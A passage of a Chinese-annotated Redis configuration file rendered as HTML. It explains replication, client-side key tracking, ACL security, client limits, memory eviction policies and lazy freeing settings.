<span class="token comment">#   | (receive writes) |      |  (exact copy) |</span>
<span class="token comment">#   +------------------+      +---------------+</span>
<span class="token comment">#</span>
<span class="token comment"># 1) Redis复制是异步的，但是你可以配置一个主服务器，如果它没有与至少给定数量的副本连接，它就会停止接受写操作</span>
<span class="token comment"># 2) 如果复制链路在相对较短的时间内丢失，Redis副本能够与主服务器执行部分再同步。您可能需要配置复制backlog大小(请参阅此文件的下一节)，并根据您的需要设置合理的值。</span>
<span class="token comment"># 3) 复制是自动的，不需要用户干预，在网络分区之后，副本会自动尝试重新连接到主节点并与它们重新同步。</span>
<span class="token comment">#</span>
<span class="token comment"># replicaof &lt;masterip&gt; &lt;masterport&gt;</span>

<span class="token comment"># 如果主机有密码保护 ( “requirepass” 配置指令) 可以在启动同步复制进程之前告诉副本进行身份验证, 否则主服务器将拒绝副本请求。</span>
<span class="token comment">#</span>
<span class="token comment"># masterauth &lt;master-password&gt;</span>
<span class="token comment">#</span>
<span class="token comment"># 然而，如果你正在使用Redis ACL，这是不够的(适用于Redis版本6或更高版本), 默认用户不能执行PSYNC命令和/或复制所需的其他命令。</span>
<span class="token comment"># 在这种情况下，最好配置一个特殊用户用于复制，并指定主用户配置如下:</span>
<span class="token comment">#</span>
<span class="token comment"># masteruser &lt;username&gt;</span>
<span class="token comment">#</span>
<span class="token comment"># 当指定了masteruser时，副本将使用新的AUTH表单对其主服务器进行身份验证: AUTH &lt;username&gt; &lt;password&gt;.</span>

<span class="token comment"># 当一个副本失去了与主服务器的连接，或者当复制仍在进行时，副本可以以两种不同的方式工作:</span>
<span class="token comment"># 1) 如果 replica-serve-stale-data 配置为"yes"(默认) 副本仍然会回复客户端请求, 可能有过时的数据, 如果这是第一次同步，则数据集可能为空.</span>
<span class="token comment"># 2) 如果 replica-serve-stale-data 配置为"no", 副本会返回给所有请求一下错误信息："MASTERDOWN Link with MASTER is down and replica-serve-stale-data is set to 'no'", 除了以下命令: INFO, REPLICAOF, AUTH, SHUTDOWN, REPLCONF, ROLE, CONFIG, SUBSCRIBE, UNSUBSCRIBE, PSUBSCRIBE, PUNSUBSCRIBE, PUBLISH, PUBSUB, COMMAND, POST, HOST and LATENCY.</span>
<span class="token comment">#</span>
<span class="token key attr-name">replica-serve-stale-data</span> <span class="token value attr-value">yes</span>

<span class="token comment"># 您可以配置副本实例是否接受写操作。</span>
<span class="token comment"># 针对副本实例写入可能有助于存储一些临时数据(因为写入副本的数据在与主服务器重新同步后很容易被删除)，但如果客户端由于错误配置而写入副本，也可能导致问题。</span>
<span class="token comment">#</span>
<span class="token comment"># Redis 2.6 版本之后默认副本是只读的。</span>
<span class="token comment"># Note: 只读副本不会被设计成暴露给互联网上不受信任的客户端。它只是防止实例被滥用的保护层。</span>
<span class="token comment"># 默认情况下，只读副本仍然可输出所有管理类命令，如CONFIG、DEBUG等。在有限的范围内，您可以使用'rename-command'来隐藏所有管理的、危险的命令，从而提高只读副本的安全性。</span>
<span class="token key attr-name">replica-read-only</span> <span class="token value attr-value">yes</span>


<span class="token comment"># 副本同步策略: 磁盘同步或套接字同步。</span>
<span class="token comment"># 新的副本和重新连接的副本不能继续复制过程，只是接收差异，需要做所谓的“完全同步”。</span>
<span class="token comment">#</span>
<span class="token comment"># RDB文件从主服务器传输到副本。有两种不同的传输方式:</span>
<span class="token comment"># 1) Disk-backed: Redis主进程创建一个新进程，将RDB文件写入磁盘。随后，父进程将文件增量地传输到副本</span>
<span class="token comment">#                 当RDB文件生成时，允许更多的副本排队，只要当前生成RDB文件的子进程完成了它的工作，排队的副本们便可以用生成的RDB文件提供服务</span>
<span class="token comment"># 2) Diskless: Redis主进程创建一个新进程，直接将RDB文件写入复制套接字，而不需要任何磁盘操作。</span>
<span class="token comment">#              使用无磁盘复制时，一旦传输开始，新的副本将进入队列，当当前传输终止时，新的传输将开始 </span>
<span class="token comment">#              当使用无盘复制时，主服务器在开始传输之前等待一段可配置的时间(以秒为单位)，希望有多个副本到达，并行传输数据。</span>
<span class="token comment">#              对于慢磁盘和快速(大带宽)网络，无磁盘复制工作得更好</span>
<span class="token key attr-name">repl-diskless-sync</span> <span class="token value attr-value">yes</span>

<span class="token comment"># 当启用无磁盘复制时，为了生成 通过套接字将RDB传输到副本 的子节点，可以配置服务器等待时间</span>
<span class="token comment"># 这很重要，因为一旦传输开始，就不可能为新的副本提供服务，这些副本将排队等待下一个RDB传输，因此服务器等待延迟以让更多副本到达。</span>
<span class="token comment">#</span>
<span class="token comment"># 延迟以秒为单位指定，默认为5秒。要完全禁用它，只需将其设置为0秒，传输将尽快开始。</span>
<span class="token key attr-name">repl-diskless-sync-delay</span> <span class="token value attr-value">5</span>

<span class="token comment"># 当使用延迟启用无磁盘复制时，如果期望的最大副本数量已连接，则可以在达到最大延迟之前让复制启动。</span>
<span class="token comment"># 默认为0意味着没有定义最大副本数量，Redis将等待全部延迟。</span>
<span class="token key attr-name">repl-diskless-sync-max-replicas</span> <span class="token value attr-value">0</span>

<span class="token comment"># -----------------------------------------------------------------------------</span>
<span class="token comment"># WARNING: 由于在这种设置中，副本不会立即在磁盘上存储RDB，因此在故障转移期间可能会导致数据丢失。</span>
<span class="token comment"># RDB无盘加载+ Redis模块不处理I/O读取可能会导致Redis在与主同步的初始阶段出现I/O错误时中止。</span>
<span class="token comment"># -----------------------------------------------------------------------------</span>
<span class="token comment"># Replica可以直接从套接字加载它从复制链路读取的RDB，或者将RDB存储到一个文件中，在从master完全接收到RDB后再读取该文件。</span>
<span class="token comment">#</span>
<span class="token comment"># 在许多情况下，磁盘比网络慢，存储和加载RDB文件可能会增加复制时间(甚至增加主服务器的Copy on Write内存和副本缓冲区)。</span>
<span class="token comment"># 然而，当直接从套接字解析RDB文件时，为了避免数据丢失，只有当新数据集在内存中完全加载时才会安全地刷新当前数据集，从而导致更高的内存使用量。</span>
<span class="token comment"># 因此，我们有以下选择:</span>
<span class="token comment">#</span>
<span class="token comment"># "disabled"    - 不要使用无磁盘加载(先将rdb文件存储到磁盘)</span>
<span class="token comment"># "swapdb"      - 在直接从套接字解析数据时，将当前db内容保存在RAM中。</span>
<span class="token comment">#                 在此模式下的副本可以在复制进行时继续服务当前数据集，除非它们无法将主服务器识别为具有来自相同复制历史的数据集</span>
<span class="token comment">#                 注意，这需要足够的内存，如果没有内存，就有OOM kill的风险</span>
<span class="token comment"># "on-empty-db" - 仅当当前数据集为空时使用无磁盘加载. </span>
<span class="token comment">#                 这样更安全，可以避免在复制期间同时加载新旧数据集。</span>
<span class="token key attr-name">repl-diskless-load</span> <span class="token value attr-value">disabled</span>

<span class="token comment"># 主机在预定义的时间间隔内向其副本发送ping。可以使用repl_ping_replica_period选项更改这个间隔。缺省值是10秒。</span>
<span class="token comment">#</span>
<span class="token comment"># repl-ping-replica-period 10</span>


<span class="token comment"># 以下选项设置的复制超时时间:</span>
<span class="token comment"># 1) 从副本的角度来看，同步期间的批量传输I/O</span>
<span class="token comment"># 2) 从副本(data, ping)的角度看主节点超时</span>
<span class="token comment"># 3) 从主节点的角度看副本超时(REPLCONF ACK ping)</span>
<span class="token comment"># 确保这个值大于为repl-ping-replica-period指定的值是很重要的，否则每次在主服务器和副本之间有低流量时都会检测到超时。缺省值是60秒。</span>
<span class="token comment">#</span>
<span class="token comment"># repl-timeout 60</span>

<span class="token comment"># 在SYNC之后禁用副本套接字上的TCP_NODELAY ?</span>
<span class="token comment">#  - yes： Redis将使用更少的TCP数据包和更少的带宽将数据发送到副本。但是这可能会增加数据在副本端出现的延迟，对于使用默认配置的Linux内核，延迟最长可达40毫秒。</span>
<span class="token comment">#  - no： 则数据出现在副本端的延迟将减少，但复制将使用更多带宽。</span>
<span class="token comment"># 默认情况下，我们优化低延迟，但在非常高的流量条件下，或者当主服务器和副本相隔很多跳时，将此选项变为“yes”可能是一个好主意。</span>
<span class="token key attr-name">repl-disable-tcp-nodelay</span> <span class="token value attr-value">no</span>

<span class="token comment"># 设置复制backlog大小。backlog是一个缓冲区，当副本断开连接一段时间后，它会积累副本数据，因此当副本想再次重新连接时，通常不需要完全重新同步，部分重新同步就足够了，只需传递断开连接时副本错过的部分数据。</span>
<span class="token comment"># 复制backlog越大，副本能够忍受断开的时间就越长，并且以后能够执行部分重新同步。</span>
<span class="token comment"># 只有当至少连接了一个副本时，才分配backlog。</span>
<span class="token comment">#</span>
<span class="token comment"># repl-backlog-size 1mb</span>

<span class="token comment"># 主服务器在一段时间内没有连接的副本后，积压将被释放。</span>
<span class="token comment"># 下面的选项配置需要经过的秒数，从最后一个副本断开连接的时间开始，以释放积压缓冲区。</span>
<span class="token comment"># 请注意，副本永远不会因为超时而释放积压，因为它们可能稍后会升级为主副本，并且应该能够正确地与其他副本“部分重新同步”:因此它们应该总是积累积压。</span>
<span class="token comment">#</span>
<span class="token comment"># 值为0意味着永远不释放待办事项。</span>
<span class="token comment">#</span>
<span class="token comment"># repl-backlog-ttl 3600</span>

<span class="token comment"># 副本优先级是Redis在INFO输出中发布的整数。它是由Redis哨兵，在主服务器不再正常工作，选择要提升为主服务器的副本时使用</span>
<span class="token comment"># 优先级低的副本被认为更适合升级，例如，如果有三个优先级为10，100,25的副本，哨兵会选择优先级为10的副本，这是最低的。</span>
<span class="token comment"># 然而，优先级为0的副本标志着该副本不能执行master角色，因此优先级为0的副本将永远不会被Redis Sentinel选中进行升级。</span>
<span class="token comment">#</span>
<span class="token comment"># 缺省情况下，优先级为100。</span>
<span class="token key attr-name">replica-priority</span> <span class="token value attr-value">100</span>

<span class="token comment"># 传播错误行为控制了当Redis无法处理来自主机的复制流中正在处理的命令时，它将如何表现。传播过程中发生的错误是意外的，并可能导致数据不一致。然而，在早期版本的Redis中存在一些边缘情况，服务器可能会复制或保留在未来版本中失败的命令。因此，默认行为是忽略此类错误并继续处理命令。</span>
<span class="token comment"># 如果应用程序希望确保没有数据分歧，则应该将此配置设置为'panic'。该值还可以设置为'panic-on-replicas'，仅当副本在复制流上遇到错误时才恐慌。一旦有足够的安全机制来防止误报崩溃，这两个恐慌值中的一个将成为未来的默认值。</span>
<span class="token comment">#</span>
<span class="token comment"># propagation-error-behavior ignore</span>

<span class="token comment"># 副本忽略磁盘写错误控制副本在无法将从主服务器接收到的写命令持久化到磁盘时的行为。</span>
<span class="token comment"># 默认情况下，这个配置被设置为'no'，在这种情况下会使副本崩溃。不建议更改这个默认值，但是为了与旧版本的Redis兼容，这个配置可以切换为“yes”，这将只是记录一个警告，并执行从master得到的写命令。</span>
<span class="token comment">#</span>
<span class="token comment"># replica-ignore-disk-write-errors no</span>


<span class="token comment"># -----------------------------------------------------------------------------</span>
<span class="token comment"># 默认情况下，Redis Sentinel在报告中包含所有副本。一个副本可以排除在Redis哨兵的公告。一个未通知的副本将被'sentinel replicas &lt;master&gt;'命令忽略，并且不会暴露给Redis sentinel的客户端。</span>
<span class="token comment"># 该选项不会改变复制优先级的行为。即使replica-announce设置为“no”，副本也可以提升为主副本。为了防止这种情况发生，请将replica-priority设置为0。</span>
<span class="token comment">#</span>
<span class="token comment"># replica-announced yes</span>

<span class="token comment"># 如果连接的副本少于N个，主服务器有可能停止接受写操作，延迟小于或等于M秒。也就是N个副本需要处于“online”状态。</span>
<span class="token comment"># 延迟时间(以秒为单位)必须&lt;=指定的值，是从副本接收到的最后一个ping计算出来的，通常每秒钟发送一次。</span>
<span class="token comment"># 此选项不保证N个副本将接受写入，但将在没有足够的副本可用的情况下将丢失写入的暴露窗口限制为指定的秒数</span>
<span class="token comment"># 例如，需要至少3个副本，延迟&lt;= 10秒使用:</span>
<span class="token comment">#</span>
<span class="token comment"># min-replicas-to-write 3</span>
<span class="token comment"># min-replicas-max-lag 10</span>
<span class="token comment">#</span>
<span class="token comment"># 将其中一个或另一个设置为0将禁用该特性。</span>
<span class="token comment"># 默认情况下，min-replica-to-write设置为0(禁用功能)，min-replica-max-lag设置为10。</span>


<span class="token comment"># Redis主机能够以不同的方式列出附加副本的地址和端口。</span>
<span class="token comment"># 例如，“INFO replication”部分提供了这些信息，在其他工具中，Redis Sentinel可以使用这些信息来发现副本实例。另一个可用此信息的地方是主机的“ROLE”命令的输出。</span>
<span class="token comment"># 副本正常上报的列表IP地址和端口可以通过以下方式获取:</span>
<span class="token comment">#   IP: 通过检查副本用于连接主服务器的套接字的对端地址，可以自动检测该地址。</span>
<span class="token comment">#   Port: 该端口在复制握手期间由副本通信，并且通常是副本用来侦听连接的端口。</span>
<span class="token comment">#</span>
<span class="token comment"># 然而，当使用端口转发或网络地址转换(NAT)时，副本实际上可能通过不同的IP和端口对可达。副本可以使用以下两个选项向其主服务器报告特定的IP和端口集，这样INFO和ROLE都将报告这些值。</span>
<span class="token comment"># 如果只需要覆盖端口或IP地址，则不需要同时使用这两个选项。</span>
<span class="token comment">#</span>
<span class="token comment"># replica-announce-ip 5.5.5.5</span>
<span class="token comment"># replica-announce-port 1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="KEYS-TRACKING">KEYS TRACKING</h2>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment">############################### KEYS TRACKING #################################</span>

<span class="token comment"># Redis实现了客户端值缓存的服务器辅助支持。</span>
<span class="token comment"># 这是使用一个invalidation table来实现的，它使用一个按键名索引的基数键来记住客户端有哪些键。</span>
<span class="token comment"># 反过来，这用于向客户端发送invalidation messages。请点击本页了解更多功能:</span>
<span class="token comment">#   https://redis.io/topics/client-side-caching</span>
<span class="token comment">#</span>
<span class="token comment"># 当对客户端启用跟踪时，所有的只读查询都被假定为缓存:这将迫使Redis在invalidation table中存储信息。当KEY被修改时，此类信息将被清除，invalidation messages将被发送到客户端。</span>
<span class="token comment"># 然而，如果工作负载被读操作严重占据，Redis可能会使用越来越多的内存来跟踪多个客户端获取的键。</span>
<span class="token comment"># </span>
<span class="token comment"># 因此，可以为无效表配置一个最大填充值。默认情况下，它被设置为1M的键，一旦达到这个限制，Redis将开始从invalidation table中删除键，即使它们没有被修改，只是为了回收内存:这将反过来迫使客户端使缓存的值无效。</span>
<span class="token comment"># 基本上，表的最大大小是在服务器端用于跟踪谁缓存了什么信息的内存和客户端在内存中保留缓存对象的能力之间进行权衡。</span>
<span class="token comment"># </span>
<span class="token comment"># 如果将该值设置为0，则意味着没有限制，并且Redis将在无效表中保留尽可能多的键。</span>
<span class="token comment"># 在“stats” INFO部分中，您可以找到关于invalidation table中每个给定时刻的键数的信息。</span>
<span class="token comment">#</span>
<span class="token comment"># Note: 当在广播模式下使用KEY跟踪时，服务器端不使用内存，因此此设置是无用的。</span>
<span class="token comment">#</span>
<span class="token comment"># tracking-table-max-keys 1000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="SECURITY：安全配置">SECURITY：安全配置</h2>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment">################################## SECURITY ###################################</span>
<span class="token comment"># 在 Redis6.0中引入了ACL（Access Control List) 的支持，可以给每个用户分配不同的权限来控制权限。</span>
<span class="token comment"># Redis ACL用户的定义格式如下:</span>
<span class="token comment">#   user &lt;username&gt; ... acl rules ...</span>
<span class="token comment">#</span>
<span class="token comment"># For example:</span>
<span class="token comment">#   user worker +@list +@connection ~jobs:* on &gt;ffa9203c493aa99</span>
<span class="token comment">#</span>
<span class="token comment"># 新连接使用特殊用户名“default”。</span>
<span class="token comment"># 如果该用户具有“nopass”规则，那么新的连接将立即作为“默认”用户进行身份验证，而不需要通过AUTH命令提供任何密码。</span>
<span class="token comment"># 否则，如果“默认”用户没有标记为“nopass”，则连接将在未验证的状态下启动，并将需要AUTH(或HELLO命令AUTH选项)才能进行身份验证并开始工作。</span>
<span class="token comment">#</span>
<span class="token comment"># 基本上ACL规则是从左到右处理的。</span>
<span class="token comment">#</span>
<span class="token comment"># ACL日志</span>
<span class="token comment"># ACL日志跟踪与ACL相关的失败命令和认证事件。ACL日志用于排除被ACL阻塞的命令失败的故障。ACL日志存储在内存中。可以使用ACL LOG RESET回收内存。</span>
<span class="token comment"># 定义下面ACL日志的最大条目长度。</span>
<span class="token key attr-name">acllog-max-len</span> <span class="token value attr-value">128</span>

<span class="token comment"># 使用外部ACL文件</span>
<span class="token comment"># 不需要在此文件中配置用户，可以使用单独列出用户的文件。两种方法不能混合使用:</span>
<span class="token comment"># 如果在这里配置用户，同时激活外部ACL文件，服务器将拒绝启动。</span>
<span class="token comment"># 外部ACL用户文件的格式与redis.conf中用于描述用户的格式完全相同。</span>
<span class="token comment">#</span>
<span class="token comment"># aclfile /etc/redis/users.acl</span>

<span class="token comment"># 重要提示: 从Redis 6开始，“requirepass” 只是一个新的ACL系统之上的兼容层。选项效果将只是为默认用户“default”设置密码。</span>
<span class="token comment"># 客户端仍然会像往常一样使用AUTH &lt;password&gt;进行身份验证，或者更明确地使用AUTH default &lt;password&gt;，如果他们遵循新协议:两者都可以工作。</span>
<span class="token comment"># requirepass与aclfile选项和ACL LOAD命令不兼容，这将导致requirepass被忽略。</span>
<span class="token comment">#</span>
<span class="token comment"># requirepass foobared</span>


<span class="token comment"># 默认情况下，新用户初始化具有限制性权限，通过等价于ACL规则'off resetkeys -@all'。</span>
<span class="token comment"># 从Redis 6.2开始，也可以使用ACL规则管理对Pub/Sub通道的访问。默认的Pub/Sub通道权限如果新用户是由acl-pubsub-default配置指令控制的，该指令接受以下值之一:</span>
<span class="token comment">#  - allchannels: 允许访问所有的Pub/Sub频道</span>
<span class="token comment">#  - resetchannels: 撤销对所有发布/订阅频道的访问</span>
<span class="token comment"># 从Redis 7.0开始，acl-pubsub-default默认为'resetchannels'权限。</span>
<span class="token comment">#</span>
<span class="token comment"># acl-pubsub-default resetchannels</span>

<span class="token comment"># 命令重命名(弃用)。</span>
<span class="token comment"># ------------------------------------------------------------------------</span>
<span class="token comment"># WARNING: 尽可能避免使用此选项。相反，使用acl从默认用户中删除命令，只将它们放在您为管理目的而创建的某个管理用户中。</span>
<span class="token comment"># ------------------------------------------------------------------------</span>
<span class="token comment"># 可以在共享环境中更改危险命令的名称。例如，CONFIG命令可能会被重命名为难以猜测的内容，以便它仍然对内部使用的工具可用，但对普通客户端不可用。</span>
<span class="token comment"># 举例：</span>
<span class="token comment"># rename-command CONFIG b840fc02d524045429941cc15f59e41cb7be6c52</span>
<span class="token comment"># 也可以通过将命令重命名为空字符串来完全终止命令:</span>
<span class="token comment"># rename-command CONFIG ""</span>
<span class="token comment">#</span>
<span class="token comment"># 请注意，更改登录到AOF文件或传输到副本的命令的名称可能会导致问题。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="CLIENT：客户端">CLIENT：客户端</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">################################### CLIENTS ####################################</span>
<span class="token comment"># 设置客户端同时最大连接数。</span>
<span class="token comment">#  默认情况下，这个限制被设置为10000个客户端，但是如果Redis服务器不能配置进程文件限制，以允许指定的限制，允许的最大客户端数量被设置为当前文件限制-32(因为Redis保留了一些文件描述符供内部使用)</span>
<span class="token comment"># 一旦达到限制，Redis将关闭所有的新连接，发送一个错误'max number of clients reached'.</span>
<span class="token comment">#</span>
<span class="token comment"># 重要说明: 当使用Redis集群时，最大连接数也与集群总线共享:集群中的每个节点将使用两个连接，一个传入连接，另一个传出连接。在非常大的集群的情况下，相应地调整限制是很重要的。</span>
<span class="token comment">#</span>
<span class="token comment"># maxclients 10000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="MEMORY-MANAGEMENT：内存管理">MEMORY MANAGEMENT：内存管理</h2>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment">############################## MEMORY MANAGEMENT ################################</span>

<span class="token comment"># 将内存使用限制设置为指定的字节数。当达到内存限制时，Redis将尝试根据所选的清除策略(参见maxmemory-policy)删除键。</span>
<span class="token comment"># 如果Redis不能根据策略删除键，或者如果策略设置为'noeviction'， Redis将开始回复会使用更多内存的命令，如SET, LPUSH等，并将继续回复只读命令，如GET。</span>
<span class="token comment"># 当使用Redis作为LRU或LFU缓存，或为实例设置硬内存限制(使用'noeviction'策略)时，此选项通常很有用。</span>
<span class="token comment">#</span>
<span class="token comment"># maxmemory &lt;bytes&gt;</span>

<span class="token comment"># MAXMEMORY策略:当达到MAXMEMORY时，Redis如何选择要删除的内容。您可以在以下行为中选择:</span>
<span class="token comment">#</span>
<span class="token comment"># volatile-lru -&gt; 使用近似的LRU驱逐，仅具有过期时间的KEY</span>
<span class="token comment"># allkeys-lru -&gt; 使用近似的LRU驱逐任何键。</span>
<span class="token comment"># volatile-lfu -&gt; 使用近似LFU驱逐LFU, 仅具有过期时间的KEY</span>
<span class="token comment"># allkeys-lfu -&gt; 使用近似的LFU驱逐任何键</span>
<span class="token comment"># volatile-random -&gt; 删除具有过期时间设置的随机KEY</span>
<span class="token comment"># allkeys-random -&gt; 删除一个随机的任意KEY</span>
<span class="token comment"># volatile-ttl -&gt; 使用最近的过期时间(小TTL)删除KEY</span>
<span class="token comment"># noeviction -&gt; 不要清除任何东西，只是在写操作时返回一个错误。</span>
<span class="token comment">#</span>
<span class="token comment"># LRU （Least Recently Used）：最近最少使用</span>
<span class="token comment"># LFU （Least Frequently Used）：最不经常使用的</span>
<span class="token comment">#</span>
<span class="token comment"># LRU、LFU和volatile-ttl均采用近似随机化算法实现。</span>
<span class="token comment">#</span>
<span class="token comment"># 注意:使用上述任何一种策略，当没有合适的键用于驱逐时，Redis将在需要更多内存的写操作时返回一个错误。</span>
<span class="token comment"># 这些命令通常用于创建新KEY、添加数据或修改现有KEY。例如:SET、INCR、HSET、LPUSH、SUNIONSTORE、SORT(由于STORE参数)和EXEC(如果事务包含任何需要内存的命令)。</span>
<span class="token comment"># 默认配置：</span>
<span class="token comment">#</span>
<span class="token comment"># maxmemory-policy noeviction</span>

<span class="token comment"># LRU、LFU和最小TTL算法都不是精确算法，而是近似算法(为了节省内存)，因此您可以调整它的速度或精度。</span>
<span class="token comment"># 默认情况下，Redis将检查五个键，并选择一个最近使用最少的键，您可以使用以下配置指令更改样本大小。默认值5可以产生足够好的结果。10非常接近真实的LRU，但消耗更多的CPU。3更快，但不是很准确</span>
<span class="token comment">#</span>
<span class="token comment"># maxmemory-samples 5</span>

<span class="token comment"># 驱逐处理被设计为在默认设置下正常工作。</span>
<span class="token comment"># 如果有一个异常大的写流量，这个值可能需要增加。降低这个值可能会降低延迟，但会影响清除处理的有效性</span>
<span class="token comment">#   0 = minimum latency, 10 = default, 100 = process without regard to latency</span>
<span class="token comment">#</span>
<span class="token comment"># maxmemory-eviction-tenacity 10</span>

<span class="token comment"># 从Redis 5开始，默认情况下副本将忽略其maxmemory设置(除非在故障转移后或手动将其提升为主内存)。</span>
<span class="token comment"># 这意味着KEY的删除将仅由主服务器处理，将DEL命令发送到副本，作为主服务器中的KEY删除。</span>
<span class="token comment"># 这种行为可以确保主副本和副本保持一致，这通常是你想要的，但是如果你的副本是可写的，或者你想让副本有一个不同的内存设置，并且你确定对副本执行的所有写入都是幂等的，那么你可以改变这个默认值(但一定要理解你在做什么)。</span>
<span class="token comment"># 请注意，由于副本默认情况下不驱逐，因此它最终可能会使用比maxmemory设置的内存更多的内存(副本上的某些缓冲区可能更大，或者数据结构有时可能占用更多内存等等)。因此，请确保监视副本，并确保它们有足够的内存，在主服务器达到配置的maxmemory设置之前不会出现真正的内存不足情况。</span>
<span class="token comment">#</span>
<span class="token comment"># replica-ignore-maxmemory yes</span>

<span class="token comment"># Redis以两种方式回收过期KEY:当这些KEY被发现过期时，在访问时，以及在后台，在所谓的“活动过期KEY”中回收。KEY空间被缓慢地交互式地扫描，寻找要回收的过期KEY，这样就有可能释放过期KEY的内存，并且在短时间内不会再次访问这些KEY。</span>
<span class="token comment"># 过期周期的默认工作将尽量避免在内存中保留超过10%的过期KEY，并尽量避免消耗总内存的25%以上，并增加系统的延迟。</span>
<span class="token comment"># 然而，可以将通常设置为“1”的过期“effort”增加到更大的值，直到值“10”。</span>
<span class="token comment"># 在其最大值时，系统将使用更多的CPU，更长的周期(技术上可能会引入更多的延迟)，并且系统中仍然存在的已经过期的KEY将更少。这是内存、CPU和延迟之间的权衡。</span>
<span class="token comment">#</span>
<span class="token comment"># active-expire-effort 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="LAZY-FREEING">LAZY FREEING</h2>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment">############################# LAZY FREEING ####################################</span>

<span class="token comment"># Redis有两个删除键的原语。一个称为DEL，是对对象的阻塞删除。这意味着服务器停止处理新命令，以便以同步方式回收与对象关联的所有内存。</span>
<span class="token comment"># 如果删除的键与一个小对象相关联，执行DEL命令所需的时间非常小，与Redis中的大多数其他O(1)或O(log_N)命令相当。</span>
<span class="token comment"># 但是，如果键与包含数百万个元素的聚合值相关联，则服务器可能阻塞很长时间(甚至几秒钟)以完成操作。</span>
<span class="token comment">#</span>
<span class="token comment"># 出于上述原因，Redis还提供了非阻塞删除原语，如UNLINK(非阻塞DEL)和FLUSHALL和FLUSHDB命令的ASYNC选项，以便在后台回收内存。这些命令在常数时间内执行。另一个线程将在后台以最快的速度递增地释放对象。</span>
<span class="token comment">#</span>
<span class="token comment"># FLUSHALL和FLUSHDB的DEL、UNLINK和ASYNC选项由用户控制.</span>
<span class="token comment"># 什么时候使用一种或另一种是好主意，这取决于应用程序的设计。</span>
<span class="token comment"># 然而，Redis服务器有时不得不删除键或刷新整个数据库作为其他操作的副作用。</span>
<span class="token comment"># 具体来说，Redis在以下场景中独立于用户调用删除对象:</span>
<span class="token comment">#</span>
<span class="token comment"># 1) 在清除时，由于maxmemory和maxmemory策略配置，为了为新数据腾出空间，不会超过指定的内存限制.</span>
<span class="token comment"># 2) 因为过期:当一个键具有相关的生存时间(参见expire命令)时，必须从内存中删除.</span>
<span class="token comment"># 3) 因为将数据存储在可能已经存在的键上的命令的副作用。</span>
     例如，RENAME命令，当它被另一个KEY替换时，可能会删除旧的KEY内容。类似地，带有STORE选项的SUNIONSTORE或SORT可以删除现有的键。
     SET命令本身删除指定键的任何旧内容，以便用指定的字符串替换它.
<span class="token comment"># 4) 在复制过程中，当一个副本与它的主数据库执行完全重新同步时，整个数据库的内容将被删除，以便加载刚刚传输的RDB文件</span>
<span class="token comment">#</span>
<span class="token comment"># 在上述所有情况下，默认是以阻塞方式删除对象，就像调用DEL一样。但是，您可以使用以下配置指令专门配置每种情况，以便像调用UNLINK一样以非阻塞的方式释放内存</span>

<span class="token key attr-name">lazyfree-lazy-eviction</span> <span class="token value attr-value">no</span>
<span class="token key attr-name">lazyfree-lazy-expire</span> <span class="token value attr-value">no</span>
<span class="token key attr-name">lazyfree-lazy-server-del</span> <span class="token value attr-value">no</span>
<span class="token key attr-name">replica-lazy-flush</span> <span class="token value attr-value">no</span>

<span class="token comment"># 当用户调用DEL代码替换为UNLINK调用是不容易的情况下，修改DEL命令的默认行为，完全像UNLINK，使用以下配置指令:</span>
<span class="token key attr-name">lazyfree-lazy-user-del</span> <span class="token value attr-value">no</span>

<span class="token comment"># FLUSHDB, FLUSHALL, SCRIPT FLUSH and FUNCTION FLUSH 同时支持异步和同步删除, 可以通过将[SYNC|ASYNC]标志传递到命令中来控制。</span>
<span class="token comment"># 当两个标志都没有传递时，该指令将用于确定是否应该异步删除数据。</span>
